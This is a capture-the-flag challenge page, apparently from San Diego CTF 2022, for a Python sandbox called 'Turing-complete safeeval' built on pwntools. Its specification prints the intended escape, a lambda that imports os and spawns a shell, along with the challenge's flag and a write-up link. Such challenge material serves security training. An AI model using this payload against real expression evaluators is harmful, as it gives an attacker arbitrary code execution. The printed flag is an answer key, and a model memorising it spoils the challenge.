# Turing-complete safeeval
## JAIL - Easy
| author | first blood | solves | points |
| --- | --- | --- | --- |
| k3v1n | fredd (thehackerscrew) | 0 | 0 |
### prompt
Hey! We just made a brand new Turing-complete calculator based on a slight modification of `pwnlib.util.safeeval` to allow defining functions, because otherwise it would be Turing-incomplete.

Still we are allowing only pure functions, so there is no security implication right?

Connect via:
`nc safeeval.sdc.tf 1337`

### original specification
Use pwntools's test_expr with the default pwntools _expr_codes list plus MAKE_FUNCTION and CALL_FUNCTION. The exploit is to define a lambda function that runs arbitrary code, like this (pwntools won't recursively check subfunctions):

`(lambda: __import__('os').system('sh'))()`

This is Turing complete because lambda calculus is Turing complete (allow defining functions)

**flag:** `sdctf{u5ing_l4mbDA5_t0_smUgg1e_m4licious_BYTECODEz}`

### write-ups
1. https://github.com/ninnikukawaii/write-ups/tree/master/San%20Diego%20CTF%202022/jail/turing-complete-safeeval